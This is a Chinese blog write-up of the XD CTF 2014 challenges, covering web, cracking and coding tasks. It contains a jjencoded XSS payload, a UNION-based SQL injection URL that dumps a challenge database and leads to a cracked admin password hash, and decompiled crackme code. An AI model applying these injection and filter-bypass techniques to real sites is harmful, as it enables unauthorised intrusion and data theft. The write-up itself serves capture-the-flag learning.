<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>XD CTF 2014 Write-ups | watch0ut Notebook</title><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/5.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.0/grids-responsive-min.css"><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">XD CTF 2014 Write-ups</h1><a id="logo" href="/.">watch0ut Notebook</a><p class="description">echo &quot;TXIuQ2VuZytHcmVhdFlZWCtKYWNrUGFuPXdhdGNoMHV0LCBhIHRlYW0gb2YgMyBjb21wdXRlciBnZWVrcy4&quot; | base64 -d</p></div><div id="nav-menu"><a href="/"><i class="fa icon-home"> 首页</i></a><a href="/about/"><i class="fa icon-about"> 关于</i></a><a href="/atom.xml"><i class="fa icon-rss"> 订阅</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">XD CTF 2014 Write-ups</h1><div class="post-meta">Oct 8, 2014<span> | </span><span class="category"><a href="/categories/CTF/">CTF</a></span><script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><div class="clear"><div id="toc" class="toc-article"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web20"><span class="toc-number">1.1.</span> <span class="toc-text">Web20</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web50"><span class="toc-number">1.2.</span> <span class="toc-text">Web50</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web70"><span class="toc-number">1.3.</span> <span class="toc-text">Web70</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web100"><span class="toc-number">1.4.</span> <span class="toc-text">Web100</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web200"><span class="toc-number">1.5.</span> <span class="toc-text">Web200</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web270"><span class="toc-number">1.6.</span> <span class="toc-text">Web270</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crack"><span class="toc-number">2.</span> <span class="toc-text">Crack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Crack100"><span class="toc-number">2.1.</span> <span class="toc-text">Crack100</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crack120"><span class="toc-number">2.2.</span> <span class="toc-text">Crack120</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crack150"><span class="toc-number">2.3.</span> <span class="toc-text">Crack150</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit600"><span class="toc-number">3.1.</span> <span class="toc-text">Exploit600</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#password生成"><span class="toc-number">3.1.1.</span> <span class="toc-text">password生成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#崩溃bug"><span class="toc-number">3.1.2.</span> <span class="toc-text">崩溃bug</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Coding"><span class="toc-number">4.</span> <span class="toc-text">Coding</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Coding120"><span class="toc-number">4.1.</span> <span class="toc-text">Coding120</span></a></li></ol></li></ol></div></div><div class="post-content"><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web20"><a href="#Web20" class="headerlink" title="Web20"></a>Web20</h2><p>主要考的是PHP彩蛋，在URL后添加如下参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">?=PHPE9568F36-D428-11d2-A769-00AA001ACF42</div><div class="line">?=PHPE9568F34-D428-11d2-A769-00AA001ACF42</div><div class="line">?=PHPE9568F35-D428-11d2-A769-00AA001ACF42</div><div class="line">?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000</div></pre></td></tr></table></figure></p>
<p>使用最后一个得到：<code>flag-WhatisPhp-mtzeXAtcKA53</code></p>
<h2 id="Web50"><a href="#Web50" class="headerlink" title="Web50"></a>Web50</h2><p>给了一个<code>Chrome</code>插件安装包，解压后，我在文件里搜了一通，未果。后来<code>Sasiki</code>告诉在<code>fuck.jpg</code>的备注属性找到如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">107 101 121 32 105 115 58 88 68 83 101 99 64 50 79 49 52</div></pre></td></tr></table></figure></p>
<p>转换一下：<code>XDSec@2O14</code></p>
<h2 id="Web70"><a href="#Web70" class="headerlink" title="Web70"></a>Web70</h2><p>题目：</p>
<p><img src="/images/XD-Web70.png" alt=""></p>
<p>这是一道纯<code>XSS</code>题，只需要弹窗即可。经测试，输入不能包含数字，字母，OMG!</p>
<p>但可以包含诸如<code>${}=</code>等字符，可以利用<code>jjencode</code>绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$=~[];$=&#123;___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:(&#123;&#125;+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:(&#123;&#125;+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$&#125;;$.$_=($.$_=$+&quot;&quot;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!&quot;&quot;+&quot;&quot;)[$.__$])+($._=(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\&quot;&quot;+$.$_$_+(![]+&quot;&quot;)[$._$_]+$.$$$_+&quot;\\&quot;+$.__$+$.$$_+$._$_+$.__+&quot;(\\\&quot;\\&quot;+$.__$+$.$$_+$.$$$+$.$_$_+$.__+$.$$__+&quot;\\&quot;+$.__$+$.$_$+$.___+$.___+$._+$.__+&quot;_\\&quot;+$.__$+$.$$_+$.$$$+$.$$$_+$.$_$$+$.$$$+$.___+&quot;_\\&quot;+$.__$+$.$$$+$.___+&quot;\\&quot;+$.__$+$.$$_+$._$$+&quot;\\&quot;+$.__$+$.$$_+$._$$+&quot;\\\&quot;\\&quot;+$.$__+$.___+&quot;)&quot;+&quot;\&quot;&quot;)())();</div><div class="line">http://utf-8.jp/public/jjencode.html</div></pre></td></tr></table></figure></p>
<p><img src="/images/XD-Web70-flag.png" alt=""></p>
<h2 id="Web100"><a href="#Web100" class="headerlink" title="Web100"></a>Web100</h2><p>查看源码，提供一张图片地址，转到后是一张二维码图片：</p>
<p><img src="/images/XD-Web100-1.png" alt=""></p>
<p>扫了一下，得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://mp.weixin.qq.com/s?__biz=MjM5Njc3NjM4MA==&amp;mid=200689499&amp;idx=2&amp;sn=76a5cb177facf0ca76dfcc2db7e135cf#rd</div><div class="line"></div><div class="line">RGB</div></pre></td></tr></table></figure></p>
<p>去URL对应文章看了一下，讲的是将信息隐藏到图片里，把题目的图片下载下来：</p>
<p><img src="/images/XD-Web100-2.png" alt=""></p>
<p>然后提示是<code>RGB</code>，我一开始提取的<code>RGB</code>的最低位信息，出来的不对。后来，又回来尝试，只提取R通道的，得到：<code>Xd$eC@2o14</code></p>
<h2 id="Web200"><a href="#Web200" class="headerlink" title="Web200"></a>Web200</h2><p>打开URL，提示需要帮助信息，在URL加help，查看源码，有个read？file=readme，后来刷新下，发现内容变了，貌似是随机显示的，多刷新几次，提示有newapp.py文件。直接去读newapp.py文件内容，经过多次刷新，恢复内容大致如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">__author__ = &apos;le4f.net&apos;</div><div class="line"></div><div class="line">import web</div><div class="line">import random</div><div class="line"></div><div class="line">urls = (</div><div class="line">    &apos;/getflag&apos;, &apos;xdctf&apos;,</div><div class="line">    &apos;/read&apos;, &apos;read&apos;,</div><div class="line">    &apos;.*&apos;,&apos;ctf&apos;</div><div class="line">    )</div><div class="line"></div><div class="line">class help:</div><div class="line">    def GET(self):</div><div class="line">        try:</div><div class="line">            return &apos;&lt;html&gt;welcome to my first web.py project.&lt;a href = \&apos;./read?file=readme\&apos;&gt;&lt;/a&gt;&lt;/html&gt;&apos;</div><div class="line">        except:</div><div class="line">            pass</div><div class="line"></div><div class="line"></div><div class="line">class read:</div><div class="line">    def GET(self):</div><div class="line">        data = web.input(file = &apos;readme&apos;)</div><div class="line">        if data[&apos;file&apos;].count(&apos;.&apos;) &gt; 1:</div><div class="line">            f = &apos;readme&apos;</div><div class="line">        else:</div><div class="line">            f = data[&apos;file&apos;]</div><div class="line"></div><div class="line">        cont = open(&quot;./&quot;+f,&quot;r&quot;).readlines()</div><div class="line">        rand = random.randint(0,len(cont)-2)</div><div class="line">        return cont[rand]+&apos;\n&apos;+cont[rand+1]</div><div class="line"></div><div class="line"></div><div class="line">class xdctf:</div><div class="line">    def func(a):</div><div class="line">        if a == &apos;le4f.net&apos;:</div><div class="line">            flag = open(&quot;flagishere&quot;,&quot;r&quot;).readlines()[0].strip()</div><div class="line">            web.header(&apos;flag&apos;, flag)</div><div class="line"></div><div class="line">    def GET(self):</div><div class="line">            try:</div><div class="line">                web.input(_unicode=func(web.input(unabletoread = &apos;show me flag!!!!&apos;).get(&apos;unabletoread&apos;)))</div><div class="line">                return &apos;flag is here?!!show me flag!!!!&apos;</div><div class="line">            except:</div><div class="line">                pass</div><div class="line"></div><div class="line"></div><div class="line">class ctf:</div><div class="line">    def GET(self):</div><div class="line">        try:</div><div class="line">            return &quot;u may need help information.&quot;</div><div class="line">        except:</div><div class="line">            pass</div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    app = web.application(urls, globals())</div><div class="line">    app.run()</div></pre></td></tr></table></figure></p>
<p>根据代码，构造<code>url：getflag?unabletoread=le4f.net</code>，提交后，在<code>response</code>的<code>header</code>里有：<code>XDCTF{X1di4nUn1Vers1tySecT3AM}</code>。</p>
<h2 id="Web270"><a href="#Web270" class="headerlink" title="Web270"></a>Web270</h2><p>首先，找到注入点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://hlecgsp1.xdctf.com:8082/api.php?c=api&amp;f=phpok&amp;id=_project&amp;param[pid]=1%20union%20select%201,concat(version(),0x7e,user()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33</div></pre></td></tr></table></figure></p>
<p>把整个数据库down下来后，在里面搜索flag，得到第一个flag：<code>flag-letmeshowyoushell</code>。</p>
<p>后来找到admin的密码：<code>d123789fd311dddeb7ce41f06a6d71fd:a5</code>，前面的<code>MD5</code>对应的是<code>198712a5</code>，后来去后台登录，发现admin的密码为<code>198712</code>。</p>
<h1 id="Crack"><a href="#Crack" class="headerlink" title="Crack"></a>Crack</h1><h2 id="Crack100"><a href="#Crack100" class="headerlink" title="Crack100"></a>Crack100</h2><p>发现是C#写的，直接拿<code>.NET Reflector</code>反编译发，发现好多乱码，看来用工具混淆了，网上搜了个C#的反混淆工具<code>de4dot</code>处理了下，恢复的代码大致如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div></pre></td><td class="code"><pre><div class="line">using System;</div><div class="line">using System.Collections.Generic;</div><div class="line">using System.ComponentModel;</div><div class="line">using System.Data;</div><div class="line">using System.Drawing;</div><div class="line">using System.Linq;</div><div class="line">using System.Text;</div><div class="line">using System.Threading.Tasks;</div><div class="line">using System.Windows.Forms;</div><div class="line">using System.IO;</div><div class="line">using System.Security.Cryptography;</div><div class="line"></div><div class="line">namespace ReverseMe</div><div class="line">&#123;</div><div class="line">    public partial class Form1 : Form</div><div class="line">    &#123;</div><div class="line">        public Form1()</div><div class="line">        &#123;</div><div class="line">            InitializeComponent();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        private void button1_Click(object sender, EventArgs e)</div><div class="line">        &#123;</div><div class="line">            decrypt();  </div><div class="line">        &#125;</div><div class="line"></div><div class="line">        private static void encrypt()</div><div class="line">        &#123;</div><div class="line">            string str2 = read_from_flag();</div><div class="line">            string str13 = str2.Substring(0, 0x20);</div><div class="line">            string str14 = str2.Substring(0x20);</div><div class="line">            string str16 = hex_to_string(smethod_5(str13));</div><div class="line">            string str20 = hex_to_string(smethod_5(base64_encode(smethod_0(str14))));</div><div class="line">            if (!write_to_encrypt(str16 + str20))</div><div class="line">            &#123;</div><div class="line">                Environment.Exit(0);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        </div><div class="line"></div><div class="line">        private static string smethod_0(string string_0)</div><div class="line">        &#123;</div><div class="line">            int[] numArray = new int[] &#123; 0x6a, 120, 0x66, 0x65, 0x62, 0x67, 0x2e, 0x1c, 0x3e, 0x20, 0x3d, 13 &#125;;</div><div class="line">            char[] chArray = string_0.ToCharArray();</div><div class="line">            string str = string.Empty;</div><div class="line">            int index = 0;</div><div class="line">            for (int i = 0; index &lt; string_0.Length; i++)</div><div class="line">            &#123;</div><div class="line">                if (i &gt; 11)</div><div class="line">                &#123;</div><div class="line">                    i = 0;</div><div class="line">                &#125;</div><div class="line">                str = str + ((Convert.ToInt32(chArray[index]) ^ Convert.ToInt32(numArray[i]))).ToString(&quot;X&quot;);</div><div class="line">                index++;</div><div class="line">            &#125;</div><div class="line">            return hex_to_string(str);</div><div class="line">        &#125;</div><div class="line">        private static string base64_encode(string string_0)</div><div class="line">        &#123;</div><div class="line">            try</div><div class="line">            &#123;</div><div class="line">                return Encoding.ASCII.GetString(Convert.FromBase64String(string_0));</div><div class="line">            &#125;</div><div class="line">            catch (Exception)</div><div class="line">            &#123;</div><div class="line">                return string.Empty;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        private static string smethod_2(string string_0)</div><div class="line">        &#123;</div><div class="line">            try</div><div class="line">            &#123;</div><div class="line">                return Convert.ToBase64String(Encoding.ASCII.GetBytes(string_0));</div><div class="line">            &#125;</div><div class="line">            catch (Exception)</div><div class="line">            &#123;</div><div class="line">                return string.Empty;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        private static string hex_to_string(string string_0)</div><div class="line">        &#123;</div><div class="line">            string str2 = &quot;&quot;;</div><div class="line">            byte[] bytes = new byte[string_0.Length / 2];</div><div class="line">            for (int i = 0; i &lt; (string_0.Length / 2); i++)</div><div class="line">            &#123;</div><div class="line">                str2 = string_0.Substring(i * 2, 2);</div><div class="line">                bytes[i] = Convert.ToByte(str2, 0x10);</div><div class="line">            &#125;</div><div class="line">            return Encoding.Default.GetString(bytes);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        private static string string_to_hex(string string_0)</div><div class="line">        &#123;</div><div class="line">            string str = &quot;&quot;;</div><div class="line">            if (string_0 == &quot;&quot;)</div><div class="line">            &#123;</div><div class="line">                return &quot;&quot;;</div><div class="line">            &#125;</div><div class="line">            byte[] bytes = Encoding.ASCII.GetBytes(string_0);</div><div class="line">            for (int i = 0; i &lt; bytes.Length; i++)</div><div class="line">            &#123;</div><div class="line">                str = str + bytes[i].ToString(&quot;X&quot;);</div><div class="line">            &#125;</div><div class="line">            return str;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        private static string smethod_5(string string_0)</div><div class="line">        &#123;</div><div class="line">            string str = string.Empty;</div><div class="line">            byte[] buffer = new byte[0x59];</div><div class="line">            byte[] buffer2 = new byte[0x59];</div><div class="line">            byte[] buffer3 = new byte[0xb1];</div><div class="line">            string str2 = string_to_hex(string_0);</div><div class="line">            for (int i = 0; i &lt; string_0.Length; i++)</div><div class="line">            &#123;</div><div class="line">                string str3 = str2.Substring(i * 2, 2);</div><div class="line">                buffer3[i] = Convert.ToByte(str3, 0x10);</div><div class="line">                buffer[i + 1] = (byte)((buffer3[i] &amp; 15) + 0xa1);</div><div class="line">                buffer2[i] = (byte)((0x9f + (buffer3[i] &gt;&gt; 4)) - (buffer3[i] &amp; 15));</div><div class="line">                str = str + buffer2[i].ToString(&quot;X&quot;) + buffer[i + 1].ToString(&quot;X&quot;);</div><div class="line">            &#125;</div><div class="line">            return str;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        private static bool write_to_encrypt(string string_0)</div><div class="line">        &#123;</div><div class="line">            bool flag;</div><div class="line">            using (FileStream stream = new FileStream(&quot;Encrypt.rs&quot;, FileMode.Create, FileAccess.ReadWrite))</div><div class="line">            &#123;</div><div class="line">                using (StreamWriter writer = new StreamWriter(stream))</div><div class="line">                &#123;</div><div class="line">                    writer.WriteLine(string_0);</div><div class="line">                    writer.Close();</div><div class="line">                    stream.Close();</div><div class="line">                    flag = true;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            return flag;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        private static string read_from_file(string filename)</div><div class="line">        &#123;</div><div class="line">            string str = string.Empty;</div><div class="line">            FileStream file = new FileStream(filename, FileMode.Open);</div><div class="line">            byte[] bytes = new byte[1024];</div><div class="line">            int length = 0;</div><div class="line">            do</div><div class="line">            &#123;</div><div class="line">                length = file.Read(bytes, 0, bytes.Length);</div><div class="line">                str += Encoding.ASCII.GetString(bytes, 0, length);</div><div class="line">            &#125; while (length &gt; 0);</div><div class="line">            file.Close();</div><div class="line">            return str;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        private static bool write_to_file(string file, string content)</div><div class="line">        &#123;</div><div class="line">            bool flag = false;</div><div class="line">            using (FileStream stream = new FileStream(file, FileMode.Create, FileAccess.ReadWrite))</div><div class="line">            &#123;</div><div class="line">                using (StreamWriter writer = new StreamWriter(stream))</div><div class="line">                &#123;</div><div class="line">                    writer.WriteLine(content);</div><div class="line">                    writer.Close();</div><div class="line">                    stream.Close();</div><div class="line">                    flag = true;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            return flag;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        private static string read_from_flag()</div><div class="line">        &#123;</div><div class="line">            string str = string.Empty;</div><div class="line">            if (File.Exists(&quot;Flag.rs&quot;))</div><div class="line">            &#123;</div><div class="line">                str = File.ReadAllText(&quot;Flag.rs&quot;, Encoding.ASCII);</div><div class="line">                if (str.Length != 0)</div><div class="line">                &#123;</div><div class="line">                    return str;</div><div class="line">                &#125;</div><div class="line">                using (FileStream stream = new FileStream(&quot;Encrypt.rs&quot;, FileMode.Create, FileAccess.ReadWrite))</div><div class="line">                &#123;</div><div class="line">                    using (StreamWriter writer = new StreamWriter(stream))</div><div class="line">                    &#123;</div><div class="line">                        writer.Close();</div><div class="line">                        stream.Close();</div><div class="line">                    &#125;</div><div class="line">                    return str;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            using (FileStream stream2 = new FileStream(&quot;Encrypt.rs&quot;, FileMode.Create, FileAccess.ReadWrite))</div><div class="line">            &#123;</div><div class="line">                using (StreamWriter writer2 = new StreamWriter(stream2))</div><div class="line">                &#123;</div><div class="line">                    writer2.Close();</div><div class="line">                    stream2.Close();</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            return str;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>对<code>C#</code>不是很熟，开始打算用<code>Python</code>写个解密函数，后来发现<code>C#</code>往文件里写内容经过编码，只能用<code>C#</code>来写了，写半天才写出来，太蛋疼了。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">private static void decrypt()</div><div class="line">&#123;</div><div class="line">    string filename = &quot;Encrypt.rs&quot;;</div><div class="line">    string data = string.Empty;</div><div class="line">    FileStream file = new FileStream(filename, FileMode.Open);</div><div class="line">    StreamReader reader = new StreamReader(file);</div><div class="line">    data = reader.ReadLine();</div><div class="line">    reader.Close();</div><div class="line">    file.Close();</div><div class="line"></div><div class="line">    byte[] bytes = Encoding.Default.GetBytes(data);</div><div class="line"></div><div class="line">    byte[] flag_bytes = new byte[41];</div><div class="line">    for (int i = 0; i &lt; bytes.Length; i += 2)</div><div class="line">    &#123;</div><div class="line">        byte byte1 = bytes[i];</div><div class="line">        byte byte2 = bytes[i + 1];</div><div class="line">        byte behind = (byte)(byte2 - 0xa1);</div><div class="line">        byte front = (byte)(byte1 + behind - 0x9f);</div><div class="line">        flag_bytes[i / 2] = (byte)(front * 16 + behind);</div><div class="line">    &#125;</div><div class="line">    string prex = Encoding.ASCII.GetString(flag_bytes, 0, 32);</div><div class="line">    string suffix = smethod_0_1(base64_decode(Encoding.ASCII.GetString(flag_bytes, 32, 9)));</div><div class="line">    write_to_file(&quot;Flag.rs&quot;, prex + suffix);</div><div class="line">&#125;</div><div class="line"></div><div class="line">private static string smethod_0_1(string string_0)</div><div class="line">&#123;</div><div class="line">    int[] numArray = new int[] &#123; 0x6a, 120, 0x66, 0x65, 0x62, 0x67, 0x2e, 0x1c, 0x3e, 0x20, 0x3d, 13 &#125;;</div><div class="line">    string hex = string_to_hex(string_0);</div><div class="line">    byte[] bytes = new byte[hex.Length / 2];</div><div class="line">    for (int i = 0; i &lt; hex.Length; i += 2)</div><div class="line">    &#123;</div><div class="line">        int value = Convert.ToInt32(hex.Substring(i, 2), 0x10);</div><div class="line">        bytes[i / 2] = (byte)(value ^ numArray[i / 2]);</div><div class="line">    &#125;</div><div class="line">    return Encoding.ASCII.GetString(bytes);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>最后，得到：<code>cplg1r7f3~xq-%!&gt;+@sb19)&lt;0^&amp;key#o==4102cesdx=</code></p>
